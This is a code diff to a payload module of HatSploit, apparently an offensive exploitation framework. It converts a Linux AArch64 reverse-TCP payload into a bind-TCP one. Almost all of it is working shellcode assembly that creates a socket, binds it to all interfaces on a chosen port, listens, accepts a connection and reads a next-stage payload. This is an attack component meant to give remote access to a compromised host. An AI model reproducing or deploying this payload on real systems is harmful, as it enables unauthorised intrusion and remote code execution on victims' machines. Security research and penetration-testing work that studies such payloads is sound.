@@ -9,18 +9,18 @@ from hatsploit.lib.core.payload.basic import *
 class HatSploitPayload(Payload, Handler):
     def __init__(self):
         super().__init__({
-            'Name': "Linux aarch64 Reverse TCP",
-            'Payload': "linux/aarch64/reverse_tcp",
+            'Name': "Linux aarch64 Bind TCP",
+            'Payload': "linux/aarch64/bind_tcp",
             'Authors': [
                 "Ivan Nikolskiy (enty8080) - payload developer",
             ],
             'Description': (
-                "This payload creates an interactive reverse TCP connection for Linux "
+                "This payload creates an interactive bind TCP connection for Linux "
                 "with AARCH64 architecture and reads next phase."
             ),
             'Arch': ARCH_AARCH64,
             'Platform': OS_LINUX,
-            'Type': REVERSE_TCP,
+            'Type': BIND_TCP,
         })
 
         self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
@@ -36,12 +36,25 @@ class HatSploitPayload(Payload, Handler):
             mov x2, 0
             mov x8, 0xc6
             svc 0
-        
             mov x12, x0
+
             adr x1, addr
             mov x2, 0x10
-            mov x8, 0xcb
+            mov x8, 0xc8
             svc 0
+
+            mov x0, x12
+            mov x1, 2
+            mov x8, 0xc9
+            svc 0
+
+            mov x0, x12
+            eor x1, x1, x1
+            eor x2, x2, x2
+            mov x8, 0xca
+            svc 0
+
+            mov x12, x0
         """
 
         if self.reliable.value:
@@ -99,8 +112,8 @@ class HatSploitPayload(Payload, Handler):
         assembly += f"""
         addr:
             .short 0x2
-            .short 0x{self.rport.little.hex()}
-            .word 0x{self.rhost.little.hex()}
+            .short 0x{self.rport.value.hex()}
+            .word 0x0
         """
 
         return self.assemble(assembly)
